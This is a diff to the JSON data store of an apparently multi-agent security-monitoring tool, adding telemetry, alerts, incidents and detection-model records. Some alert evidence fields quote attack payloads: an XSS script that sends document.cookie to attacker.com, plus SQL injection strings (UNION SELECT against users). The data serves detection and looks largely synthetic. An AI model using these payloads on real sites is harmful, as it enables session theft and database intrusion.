@@ -1,6 +1,97 @@
 {
   "rawEvents": [
     {
+      "id": "EXT-1789717018510-a596",
+      "source": "system",
+      "eventType": "External Telemetry Ingest",
+      "rawPayload": "Sep 17 10:20:00 auth-node01 sshd[9999]: Failed password for invalid user admin from 192.0.2.45 port 51234 ssh2",
+      "normalizedFields": {
+        "host": "external-host",
+        "severity": "LOW",
+        "details": "Sep 17 10:20:00 auth-node01 sshd[9999]: Failed password for invalid user admin from 192.0.2.45 port 51234 ssh2",
+        "features": {},
+        "isSimulated": false,
+        "telemetrySource": "EXTERNAL_AGENT"
+      },
+      "eventTimestamp": "2026-09-18T07:36:58.510Z",
+      "sourceIp": "127.0.0.1",
+      "destinationIp": "127.0.0.1",
+      "host": "external-host",
+      "severity": "LOW",
+      "isTestEvent": false,
+      "contentHash": "6a0c248640e85be6b91cf3b8f33ef085972fec64bee23676be1a752e47f7b9d3",
+      "createdAt": "2026-09-18T07:36:58.510Z"
+    },
+    {
+      "id": "SYS-1789717018499-0654a5",
+      "source": "system",
+      "eventType": "System Heartbeat Telemetry",
+      "rawPayload": "{\"hostname\":\"localhost\",\"platform\":\"linux\",\"arch\":\"x64\",\"uptimeSeconds\":1353,\"cpuCount\":2,\"cpuUsagePercent\":0,\"totalMemoryBytes\":4294967296,\"freeMemoryBytes\":3250757632,\"usedMemoryPercent\":24.3,\"processCount\":1,\"heapUsedBytes\":88301176,\"loadAverage\":[0,0,0]}",
+      "normalizedFields": {
+        "host": "localhost",
+        "severity": "LOW",
+        "details": "Host localhost telemetry: CPU 0%, Memory 24.3% (3100MB free).",
+        "features": {
+          "cpuUsage": 0,
+          "memoryUsage": 24.3,
+          "loadAvg1m": 0,
+          "heapUsedMb": 84,
+          "uptimeHours": 0.4
+        },
+        "isSimulated": false,
+        "telemetrySource": "HOST_SYSTEM"
+      },
+      "eventTimestamp": "2026-09-18T07:36:58.499Z",
+      "sourceIp": "127.0.0.1",
+      "destinationIp": "127.0.0.1",
+      "host": "localhost",
+      "username": "root",
+      "severity": "LOW",
+      "isTestEvent": false,
+      "contentHash": "5b5bb4b28e1175cd1a93fa31d642431f5c9065edbe5d1a8fcf6c6d823112de14",
+      "createdAt": "2026-09-18T07:36:58.501Z"
+    },
+    {
+      "id": "WIN-NET-6af921bd",
+      "source": "network",
+      "eventType": "Network Socket & Interface Telemetry",
+      "rawPayload": "ActiveSockets: 0, ListeningPorts: [], Interfaces: ['169.254.8.1', '127.0.0.1']",
+      "normalizedFields": {
+        "host": "localhost",
+        "severity": "LOW",
+        "details": "Passive socket inspection: 0 active sockets, 0 listening ports.",
+        "features": {
+          "total_sockets": 0,
+          "listening_ports_count": 0,
+          "syn_sent_count": 0,
+          "is_packet_sniffing": false
+        },
+        "isSimulated": false,
+        "telemetrySource": "EXTERNAL_AGENT",
+        "sourceMetadata": {
+          "source_type": "network_telemetry",
+          "hostname": "localhost",
+          "collector_name": "NetworkTelemetryCollector",
+          "event_id": "WIN-NET-6af921bd",
+          "timestamp": "2026-09-18T07:24:37.208656+00:00",
+          "raw_message": "ActiveSockets: 0, ListeningPorts: [], Interfaces: ['169.254.8.1', '127.0.0.1']",
+          "collection_status": "COLLECTED",
+          "telemetry_type": "socket_and_interface_state",
+          "inspection_mode": "passive_local_tables",
+          "interfaces_count": 2
+        }
+      },
+      "eventTimestamp": "2026-09-18T07:24:37.208Z",
+      "sourceIp": "169.254.8.1",
+      "destinationIp": "127.0.0.1",
+      "host": "localhost",
+      "username": null,
+      "severity": "LOW",
+      "isTestEvent": false,
+      "contentHash": "f2e2aadfb1c6b66063b8e9a69bfe0e29cd7f299d9cf22bab44e6c6a20ad000f6",
+      "createdAt": "2026-09-18T07:24:37.229Z"
+    },
+    {
       "id": "WIN-NET-68cd137d",
       "source": "network",
       "eventType": "Network Socket & Interface Telemetry",
@@ -1497,6 +1588,281 @@
   "correlations": [],
   "riskAssessments": [],
   "alerts": [
+    {
+      "alertId": "ALT-018489-XSJQ",
+      "incidentId": "INC-20260918-O3QP1",
+      "title": "XSS_ATTACK",
+      "description": "Reflected XSS attempt <script>alert(\"XSS\")</script>",
+      "alertType": "XSS_ATTACK",
+      "severity": "CRITICAL",
+      "riskScore": 85,
+      "priority": "P2",
+      "status": "NEW",
+      "mitreTechniques": [],
+      "evidence": [
+        "<script>document.location=\"http://attacker.com/steal?cookie=\"+document.cookie</script>",
+        "Agent: ApplicationAgent",
+        "Detection Method: Multi-Agent Ensemble / Isolation Forest",
+        "Severity Rule: Multi-Stage Infiltration & Critical Compromise (Assigned Critical severity under Multi-Stage Infiltration & Critical Compromise: Risk score is 85/100 with .)"
+      ],
+      "id": "ALT-1789717018491-fckrc",
+      "createdAt": "2026-09-18T07:36:58.491Z"
+    },
+    {
+      "alertId": "ALT-018485-L35D",
+      "incidentId": "INC-20260918-6SV4C",
+      "title": "PORT_SCAN",
+      "description": "Repeated port scan telemetry burst",
+      "alertType": "PORT_SCAN",
+      "severity": "MEDIUM",
+      "riskScore": 60,
+      "priority": "P3",
+      "status": "NEW",
+      "mitreTechniques": [],
+      "evidence": [
+        "Agent: NetworkAgent",
+        "Detection Method: Multi-Agent Ensemble / Isolation Forest",
+        "Severity Rule: Anomalous Behavior & Port Reconnaissance (Assigned Medium severity under Anomalous Behavior & Port Reconnaissance: Risk score is 60/100. Factors: Reconnaissance / Anomaly pattern: PORT_SCAN.)"
+      ],
+      "id": "ALT-1789717018487-03rpt",
+      "createdAt": "2026-09-18T07:36:58.487Z"
+    },
+    {
+      "alertId": "ALT-018481-J5JT",
+      "incidentId": "INC-20260918-3R6TQ",
+      "title": "PORT_SCAN",
+      "description": "Repeated port scan telemetry burst",
+      "alertType": "PORT_SCAN",
+      "severity": "MEDIUM",
+      "riskScore": 60,
+      "priority": "P3",
+      "status": "NEW",
+      "mitreTechniques": [],
+      "evidence": [
+        "Agent: NetworkAgent",
+        "Detection Method: Multi-Agent Ensemble / Isolation Forest",
+        "Severity Rule: Anomalous Behavior & Port Reconnaissance (Assigned Medium severity under Anomalous Behavior & Port Reconnaissance: Risk score is 60/100. Factors: Reconnaissance / Anomaly pattern: PORT_SCAN.)"
+      ],
+      "id": "ALT-1789717018483-l32tr",
+      "createdAt": "2026-09-18T07:36:58.483Z"
+    },
+    {
+      "alertId": "ALT-018476-0R8I",
+      "incidentId": "INC-20260918-5HB3R",
+      "title": "PORT_SCAN",
+      "description": "Repeated port scan telemetry burst",
+      "alertType": "PORT_SCAN",
+      "severity": "MEDIUM",
+      "riskScore": 60,
+      "priority": "P3",
+      "status": "NEW",
+      "mitreTechniques": [],
+      "evidence": [
+        "Agent: NetworkAgent",
+        "Detection Method: Multi-Agent Ensemble / Isolation Forest",
+        "Severity Rule: Anomalous Behavior & Port Reconnaissance (Assigned Medium severity under Anomalous Behavior & Port Reconnaissance: Risk score is 60/100. Factors: Reconnaissance / Anomaly pattern: PORT_SCAN.)"
+      ],
+      "id": "ALT-1789717018479-mhdun",
+      "createdAt": "2026-09-18T07:36:58.479Z"
+    },
+    {
+      "title": "[SystemAgent] Brute Force Attack",
+      "description": "Multiple repeated authentication failures (4 failed attempts) from 203.0.113.50.",
+      "alertType": "Brute Force Attack",
+      "severity": "MEDIUM",
+      "riskScore": 85,
+      "priority": "P3",
+      "mitreTechniques": [
+        "T1110"
+      ],
+      "evidence": [
+        "4 failed SSH/auth attempts detected within sequence"
+      ],
+      "id": "ALT-84601989",
+      "alertId": "ALT-84601989",
+      "createdAt": "2026-09-18T07:36:58.460Z",
+      "status": "NEW"
+    },
+    {
+      "title": "[NetworkAgent] Port Scanning",
+      "description": "Rapid port sweep detected across 5 destination ports from host 203.0.113.50.",
+      "alertType": "Port Scanning",
+      "severity": "HIGH",
+      "riskScore": 90,
+      "priority": "P2",
+      "mitreTechniques": [
+        "T1046"
+      ],
+      "evidence": [
+        "Scanned ports: 22, 80, 443, 3306, 5432"
+      ],
+      "id": "ALT-84598247",
+      "alertId": "ALT-84598247",
+      "createdAt": "2026-09-18T07:36:58.459Z",
+      "status": "NEW"
+    },
+    {
+      "title": "[ApplicationAgent] Suspicious URL Access",
+      "description": "Unauthorized probing of administrative endpoint.",
+      "alertType": "Suspicious URL Access",
+      "severity": "MEDIUM",
+      "riskScore": 70,
+      "priority": "P3",
+      "mitreTechniques": [
+        "T1595"
+      ],
+      "evidence": [
+        "2026-09-17T11:02:05Z 203.0.113.50 GET /admin/console HTTP/1.1 403 text/html"
+      ],
+      "id": "ALT-84584359",
+      "alertId": "ALT-84584359",
+      "createdAt": "2026-09-18T07:36:58.458Z",
+      "status": "NEW"
+    },
+    {
+      "title": "[ApplicationAgent] SQL Injection",
+      "description": "SQL injection payload detected aiming at database enumeration or bypass.",
+      "alertType": "SQL Injection",
+      "severity": "CRITICAL",
+      "riskScore": 95,
+      "priority": "P1",
+      "mitreTechniques": [
+        "T1190"
+      ],
+      "evidence": [
+        "2026-09-17T11:02:01Z 203.0.113.50 POST /api/data HTTP/1.1 200 application/json body=1' UNION SELECT * FROM users--"
+      ],
+      "id": "ALT-84576548",
+      "alertId": "ALT-84576548",
+      "createdAt": "2026-09-18T07:36:58.457Z",
+      "status": "NEW"
+    },
+    {
+      "title": "[SystemAgent] Privilege Escalation",
+      "description": "Administrative root shell acquired via sudo execution.",
+      "alertType": "Privilege Escalation",
+      "severity": "HIGH",
+      "riskScore": 92,
+      "priority": "P2",
+      "mitreTechniques": [
+        "T1548.003"
+      ],
+      "evidence": [
+        "Sep 17 11:01:11 server01 sudo: admin : TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=/bin/bash"
+      ],
+      "id": "ALT-84551499",
+      "alertId": "ALT-84551499",
+      "createdAt": "2026-09-18T07:36:58.456Z",
+      "status": "NEW"
+    },
+    {
+      "alertId": "ALT-018442-QBP7",
+      "incidentId": "INC-20260918-5QWJ7",
+      "title": "UDP Amplification Storm",
+      "description": "Bandwidth threshold exceeded: 1.2M pps from 198.51.100.111",
+      "alertType": "DDoS_FLOOD",
+      "severity": "CRITICAL",
+      "riskScore": 88,
+      "priority": "P2",
+      "status": "NEW",
+      "mitreTechniques": [],
+      "evidence": [
+        "Packet rate: 1.2M pps",
+        "Entropy: 0.98",
+        "Destination Port: 53",
+        "Agent: ThreatDetectionAgent",
+        "Detection Method: Isolation Forest Volumetric Anomaly",
+        "Severity Rule: Multi-Stage Infiltration & Critical Compromise (Assigned Critical severity under Multi-Stage Infiltration & Critical Compromise: Risk score is 88/100 with .)"
+      ],
+      "id": "ALT-1789717018443-a6tac",
+      "createdAt": "2026-09-18T07:36:58.443Z"
+    },
+    {
+      "alertId": "ALT-018430-E9X0",
+      "incidentId": "INC-20260918-W1DNZ",
+      "title": "Lateral Movement & Reconnaissance Sequence",
+      "description": "Correlated event sequence: Port Scan -> SSH Brute Force -> Web Exploit",
+      "alertType": "MULTI_STAGE_KILLCHAIN",
+      "severity": "CRITICAL",
+      "riskScore": 95,
+      "priority": "P1",
+      "status": "NEW",
+      "mitreTechniques": [],
+      "evidence": [
+        "Stage 1: Reconnaissance (NetworkAgent)",
+        "Stage 2: Initial Access (SystemAgent)",
+        "Stage 3: Persistence",
+        "Agent: CorrelationAgent",
+        "Detection Method: Multi-Agent Temporal Sliding Window",
+        "Severity Rule: Multi-Stage Infiltration & Critical Compromise (Assigned Critical severity under Multi-Stage Infiltration & Critical Compromise: Risk score is 95/100 with Cross-Agent correlation active (NetworkAgent, SystemAgent, ApplicationAgent); Critical threat classification: MULTI_STAGE_KILLCHAIN.)"
+      ],
+      "id": "ALT-1789717018431-i8ujc",
+      "createdAt": "2026-09-18T07:36:58.431Z"
+    },
+    {
+      "alertId": "ALT-018424-OLW9",
+      "incidentId": "INC-20260918-3WMDH",
+      "title": "SQL Injection via Web Parameter",
+      "description": "SQL injection attempt in GET /api/products?id=1%20UNION%20SELECT",
+      "alertType": "SQL_INJECTION",
+      "severity": "CRITICAL",
+      "riskScore": 92,
+      "priority": "P1",
+      "status": "NEW",
+      "mitreTechniques": [],
+      "evidence": [
+        "Pattern detected: UNION SELECT",
+        "HTTP 500 error triggered on downstream database",
+        "Agent: ApplicationAgent",
+        "Detection Method: Regex Signature & AST Anomaly Analyzer",
+        "Severity Rule: Multi-Stage Infiltration & Critical Compromise (Assigned Critical severity under Multi-Stage Infiltration & Critical Compromise: Risk score is 92/100 with Exploitation pattern detected: SQL_INJECTION.)"
+      ],
+      "id": "ALT-1789717018426-74t6o",
+      "createdAt": "2026-09-18T07:36:58.426Z"
+    },
+    {
+      "alertId": "ALT-018418-US2C",
+      "incidentId": "INC-20260918-K12U8",
+      "title": "SSH Credential Brute Force",
+      "description": "Rapid failed authentication attempts exceeding 30 attempts per minute",
+      "alertType": "BRUTE_FORCE",
+      "severity": "HIGH",
+      "riskScore": 84,
+      "priority": "P2",
+      "status": "NEW",
+      "mitreTechniques": [],
+      "evidence": [
+        "Account: root, admin, test",
+        "34 failed password attempts in 45s",
+        "Agent: SystemAgent",
+        "Detection Method: Failed Authentication Thresholding",
+        "Severity Rule: Active Exploitation & Credential Abuse (Assigned High severity under Active Exploitation & Credential Abuse: Risk score is 84/100. Factors: Exploitation pattern detected: BRUTE_FORCE.)"
+      ],
+      "id": "ALT-1789717018420-dk9td",
+      "createdAt": "2026-09-18T07:36:58.420Z"
+    },
+    {
+      "alertId": "ALT-018413-2GU4",
+      "incidentId": "INC-20260918-087TT",
+      "title": "SYN Port Sweep",
+      "description": "Distributed port scan targeting ports 22, 80, 443, 8080, 3389 within 2 seconds",
+      "alertType": "PORT_SCAN",
+      "severity": "HIGH",
+      "riskScore": 76,
+      "priority": "P2",
+      "status": "NEW",
+      "mitreTechniques": [],
+      "evidence": [
+        "SYN packets without ACK completion",
+        "5 distinct ports scanned in 200ms",
+        "Entropy: 0.94",
+        "Agent: NetworkAgent",
+        "Detection Method: Port Frequency & Packet Entropy Engine",
+        "Severity Rule: Active Exploitation & Credential Abuse (Assigned High severity under Active Exploitation & Credential Abuse: Risk score is 76/100. Factors: Reconnaissance / Anomaly pattern: PORT_SCAN.)"
+      ],
+      "id": "ALT-1789717018414-hrqnt",
+      "createdAt": "2026-09-18T07:36:58.414Z"
+    },
     {
       "alertId": "ALT-961857-9CWS",
       "incidentId": "INC-20260917-EQGQF",
@@ -3376,6 +3742,237 @@
   ],
   "incidents": [
     {
+      "incidentId": "INC-20260918-O3QP1",
+      "title": "XSS_ATTACK",
+      "description": "Reflected XSS attempt <script>alert(\"XSS\")</script>",
+      "severity": "CRITICAL",
+      "priority": "P2",
+      "status": "NEW",
+      "riskScore": 85,
+      "primaryIp": "198.51.100.222",
+      "mitreTechniques": [],
+      "investigationNotes": [
+        {
+          "id": "note-INC-20260918-O3QP1-1",
+          "author": "SOC Workflow Automation",
+          "note": "Incident automatically opened. Severity: Critical. Justification: Assigned Critical severity under Multi-Stage Infiltration & Critical Compromise: Risk score is 85/100 with .",
+          "timestamp": "2026-09-18T07:36:58.489Z"
+        }
+      ],
+      "id": "INC-20260918-O3QP1",
+      "createdAt": "2026-09-18T07:36:58.489Z"
+    },
+    {
+      "incidentId": "INC-20260918-6SV4C",
+      "title": "PORT_SCAN",
+      "description": "Repeated port scan telemetry burst",
+      "severity": "MEDIUM",
+      "priority": "P3",
+      "status": "NEW",
+      "riskScore": 60,
+      "primaryIp": "192.0.2.200",
+      "mitreTechniques": [],
+      "investigationNotes": [
+        {
+          "id": "note-INC-20260918-6SV4C-1",
+          "author": "SOC Workflow Automation",
+          "note": "Incident automatically opened. Severity: Medium. Justification: Assigned Medium severity under Anomalous Behavior & Port Reconnaissance: Risk score is 60/100. Factors: Reconnaissance / Anomaly pattern: PORT_SCAN.",
+          "timestamp": "2026-09-18T07:36:58.485Z"
+        }
+      ],
+      "id": "INC-20260918-6SV4C",
+      "createdAt": "2026-09-18T07:36:58.485Z"
+    },
+    {
+      "incidentId": "INC-20260918-3R6TQ",
+      "title": "PORT_SCAN",
+      "description": "Repeated port scan telemetry burst",
+      "severity": "MEDIUM",
+      "priority": "P3",
+      "status": "NEW",
+      "riskScore": 60,
+      "primaryIp": "192.0.2.200",
+      "mitreTechniques": [],
+      "investigationNotes": [
+        {
+          "id": "note-INC-20260918-3R6TQ-1",
+          "author": "SOC Workflow Automation",
+          "note": "Incident automatically opened. Severity: Medium. Justification: Assigned Medium severity under Anomalous Behavior & Port Reconnaissance: Risk score is 60/100. Factors: Reconnaissance / Anomaly pattern: PORT_SCAN.",
+          "timestamp": "2026-09-18T07:36:58.481Z"
+        }
+      ],
+      "id": "INC-20260918-3R6TQ",
+      "createdAt": "2026-09-18T07:36:58.481Z"
+    },
+    {
+      "incidentId": "INC-20260918-5HB3R",
+      "title": "PORT_SCAN",
+      "description": "Repeated port scan telemetry burst",
+      "severity": "MEDIUM",
+      "priority": "P3",
+      "status": "NEW",
+      "riskScore": 60,
+      "primaryIp": "192.0.2.200",
+      "mitreTechniques": [],
+      "investigationNotes": [
+        {
+          "id": "note-INC-20260918-5HB3R-1",
+          "author": "SOC Workflow Automation",
+          "note": "Incident automatically opened. Severity: Medium. Justification: Assigned Medium severity under Anomalous Behavior & Port Reconnaissance: Risk score is 60/100. Factors: Reconnaissance / Anomaly pattern: PORT_SCAN.",
+          "timestamp": "2026-09-18T07:36:58.476Z"
+        }
+      ],
+      "id": "INC-20260918-5HB3R",
+      "createdAt": "2026-09-18T07:36:58.476Z"
+    },
+    {
+      "incidentId": "INC-018454",
+      "title": "Privilege Escalation Intrusion Chain",
+      "description": "Multi-agent threat analysis identified 5 security anomaly events with risk score 98.",
+      "severity": "CRITICAL",
+      "priority": "P1",
+      "status": "NEW",
+      "riskScore": 98,
+      "primaryIp": "203.0.113.50",
+      "affectedHost": "server01",
+      "mitreTechniques": [
+        "T1548.003",
+        "T1190",
+        "T1595",
+        "T1046",
+        "T1110"
+      ],
+      "id": "INC-018454",
+      "createdAt": "2026-09-18T07:36:58.454Z"
+    },
+    {
+      "incidentId": "INC-20260918-5QWJ7",
+      "title": "UDP Amplification Storm",
+      "description": "Bandwidth threshold exceeded: 1.2M pps from 198.51.100.111",
+      "severity": "CRITICAL",
+      "priority": "P2",
+      "status": "RESOLVED",
+      "riskScore": 88,
+      "primaryIp": "198.51.100.111",
+      "affectedHost": "edge-router-01",
+      "mitreTechniques": [],
+      "investigationNotes": [
+        {
+          "id": "note-INC-20260918-5QWJ7-1",
+          "author": "SOC Workflow Automation",
+          "note": "Incident automatically opened. Severity: Critical. Justification: Assigned Critical severity under Multi-Stage Infiltration & Critical Compromise: Risk score is 88/100 with .",
+          "timestamp": "2026-09-18T07:36:58.442Z"
+        }
+      ],
+      "id": "INC-20260918-5QWJ7",
+      "createdAt": "2026-09-18T07:36:58.442Z",
+      "updatedAt": "2026-09-18T07:36:58.447Z"
+    },
+    {
+      "incidentId": "INC-20260918-W1DNZ",
+      "title": "Lateral Movement & Reconnaissance Sequence",
+      "description": "Correlated event sequence: Port Scan -> SSH Brute Force -> Web Exploit",
+      "severity": "CRITICAL",
+      "priority": "P1",
+      "status": "NEW",
+      "riskScore": 95,
+      "primaryIp": "203.0.113.88",
+      "affectedHost": "domain-controller-01",
+      "mitreTechniques": [],
+      "investigationNotes": [
+        {
+          "id": "note-INC-20260918-W1DNZ-1",
+          "author": "SOC Workflow Automation",
+          "note": "Incident automatically opened. Severity: Critical. Justification: Assigned Critical severity under Multi-Stage Infiltration & Critical Compromise: Risk score is 95/100 with Cross-Agent correlation active (NetworkAgent, SystemAgent, ApplicationAgent); Critical threat classification: MULTI_STAGE_KILLCHAIN.",
+          "timestamp": "2026-09-18T07:36:58.430Z"
+        }
+      ],
+      "id": "INC-20260918-W1DNZ",
+      "createdAt": "2026-09-18T07:36:58.430Z"
+    },
+    {
+      "incidentId": "INC-20260918-3WMDH",
+      "title": "SQL Injection via Web Parameter",
+      "description": "SQL injection attempt in GET /api/products?id=1%20UNION%20SELECT",
+      "severity": "CRITICAL",
+      "priority": "P1",
+      "status": "NEW",
+      "riskScore": 92,
+      "primaryIp": "192.0.2.144",
+      "affectedHost": "ecommerce-web-prod",
+      "mitreTechniques": [],
+      "investigationNotes": [
+        {
+          "id": "note-INC-20260918-3WMDH-1",
+          "author": "SOC Workflow Automation",
+          "note": "Incident automatically opened. Severity: Critical. Justification: Assigned Critical severity under Multi-Stage Infiltration & Critical Compromise: Risk score is 92/100 with Exploitation pattern detected: SQL_INJECTION.",
+          "timestamp": "2026-09-18T07:36:58.424Z"
+        }
+      ],
+      "id": "INC-20260918-3WMDH",
+      "createdAt": "2026-09-18T07:36:58.424Z"
+    },
+    {
+      "incidentId": "INC-20260918-K12U8",
+      "title": "SSH Credential Brute Force",
+      "description": "Rapid failed authentication attempts exceeding 30 attempts per minute",
+      "severity": "HIGH",
+      "priority": "P2",
+      "status": "NEW",
+      "riskScore": 84,
+      "primaryIp": "198.51.100.82",
+      "affectedHost": "auth-server-01",
+      "mitreTechniques": [],
+      "investigationNotes": [
+        {
+          "id": "note-INC-20260918-K12U8-1",
+          "author": "SOC Workflow Automation",
+          "note": "Incident automatically opened. Severity: High. Justification: Assigned High severity under Active Exploitation & Credential Abuse: Risk score is 84/100. Factors: Exploitation pattern detected: BRUTE_FORCE.",
+          "timestamp": "2026-09-18T07:36:58.418Z"
+        }
+      ],
+      "id": "INC-20260918-K12U8",
+      "createdAt": "2026-09-18T07:36:58.418Z"
+    },
+    {
+      "incidentId": "INC-20260918-087TT",
+      "title": "SYN Port Sweep",
+      "description": "Distributed port scan targeting ports 22, 80, 443, 8080, 3389 within 2 seconds",
+      "severity": "HIGH",
+      "priority": "P2",
+      "status": "NEW",
+      "riskScore": 76,
+      "primaryIp": "203.0.113.15",
+      "mitreTechniques": [],
+      "investigationNotes": [
+        {
+          "id": "note-INC-20260918-087TT-1",
+          "author": "SOC Workflow Automation",
+          "note": "Incident automatically opened. Severity: High. Justification: Assigned High severity under Active Exploitation & Credential Abuse: Risk score is 76/100. Factors: Reconnaissance / Anomaly pattern: PORT_SCAN.",
+          "timestamp": "2026-09-18T07:36:58.412Z"
+        }
+      ],
+      "id": "INC-20260918-087TT",
+      "createdAt": "2026-09-18T07:36:58.413Z"
+    },
+    {
+      "incidentId": "INC-EVAL-018391",
+      "title": "Automated Evaluation Incident",
+      "description": "Synthetic incident for connectivity verification",
+      "severity": "HIGH",
+      "priority": "P2",
+      "status": "NEW",
+      "riskScore": 78,
+      "primaryIp": "198.51.100.99",
+      "affectedHost": "eval-workstation",
+      "mitreTechniques": [
+        "T1110"
+      ],
+      "investigationNotes": [],
+      "id": "INC-EVAL-018391",
+      "createdAt": "2026-09-18T07:36:58.403Z"
+    },
+    {
       "incidentId": "INC-20260917-EQGQF",
       "title": "XSS_ATTACK",
       "description": "Reflected XSS attempt <script>alert(\"XSS\")</script>",
@@ -5030,6 +5627,19 @@
   ],
   "incidentHistory": [
     {
+      "id": "INCH-1789717018447-ldmc2",
+      "incidentId": "INC-20260918-5QWJ7",
+      "changedBy": "system",
+      "changeType": "STATUS_UPDATE",
+      "previousState": {
+        "status": "NEW"
+      },
+      "newState": {
+        "status": "RESOLVED"
+      },
+      "timestamp": "2026-09-18T07:36:58.447Z"
+    },
+    {
       "id": "INCH-1789665961814-cww1r",
       "incidentId": "INC-20260917-RO1HQ",
       "changedBy": "system",
@@ -5154,6 +5764,31 @@
   "reports": [],
   "models": [
     {
+      "id": "RF-20260918-071905",
+      "modelType": "ISOLATION_FOREST",
+      "featureSchemaVersion": "cicids2017-v1",
+      "trainingTimestamp": "2026-09-18T07:19:05.894855Z",
+      "classes": [
+        "BENIGN",
+        "DDoS",
+        "PortScan"
+      ],
+      "updatedAt": "2026-09-18T07:29:04.648Z",
+      "createdAt": "2026-09-18T07:25:31.997Z"
+    },
+    {
+      "id": "IF-20260918-071908",
+      "modelType": "ISOLATION_FOREST",
+      "featureSchemaVersion": "cicids2017-v1",
+      "trainingTimestamp": "2026-09-18T07:19:08.619419Z",
+      "classes": [
+        "BENIGN",
+        "ANOMALY"
+      ],
+      "updatedAt": "2026-09-18T07:29:04.646Z",
+      "createdAt": "2026-09-18T07:25:31.996Z"
+    },
+    {
       "id": "RF-MODEL-842693",
       "name": "Random Forest Threat Classifier v2",
       "version": "2.1.0",
@@ -5198,7 +5833,7 @@
         "BENIGN",
         "ANOMALY"
       ],
-      "updatedAt": "2026-09-17T18:05:55.943Z",
+      "updatedAt": "2026-09-18T07:29:04.649Z",
       "createdAt": "2026-09-17T10:19:33.460Z"
     },
     {
@@ -5211,7 +5846,7 @@
         "DDoS",
         "PortScan"
       ],
-      "updatedAt": "2026-09-17T18:05:55.944Z",
+      "updatedAt": "2026-09-18T07:29:04.649Z",
       "createdAt": "2026-09-17T10:19:29.754Z"
     },
     {
@@ -5224,7 +5859,7 @@
         "DDoS",
         "PortScan"
       ],
-      "updatedAt": "2026-09-17T18:05:55.948Z",
+      "updatedAt": "2026-09-18T07:29:04.655Z",
       "createdAt": "2026-09-17T10:19:25.998Z"
     },
     {
@@ -5236,7 +5871,7 @@
         "BENIGN",
         "ANOMALY"
       ],
-      "updatedAt": "2026-09-17T18:05:55.947Z",
+      "updatedAt": "2026-09-18T07:29:04.654Z",
       "createdAt": "2026-09-17T10:19:25.998Z"
     },
     {
@@ -5249,7 +5884,7 @@
         "DDoS",
         "PortScan"
       ],
-      "updatedAt": "2026-09-17T18:05:55.946Z",
+      "updatedAt": "2026-09-18T07:29:04.653Z",
       "createdAt": "2026-09-17T10:19:25.998Z"
     },
     {
@@ -5262,7 +5897,7 @@
         "DDoS",
         "PortScan"
       ],
-      "updatedAt": "2026-09-17T18:05:55.945Z",
+      "updatedAt": "2026-09-18T07:29:04.652Z",
       "createdAt": "2026-09-17T10:19:25.997Z"
     },
     {
@@ -5274,7 +5909,7 @@
         "BENIGN",
         "ANOMALY"
       ],
-      "updatedAt": "2026-09-17T18:05:55.949Z",
+      "updatedAt": "2026-09-18T07:29:04.656Z",
       "createdAt": "2026-09-17T09:57:59.656Z"
     },
     {
@@ -5287,7 +5922,7 @@
         "DDoS",
         "PortScan"
       ],
-      "updatedAt": "2026-09-17T18:05:55.950Z",
+      "updatedAt": "2026-09-18T07:29:04.657Z",
       "createdAt": "2026-09-17T09:57:59.656Z"
     }
   ]
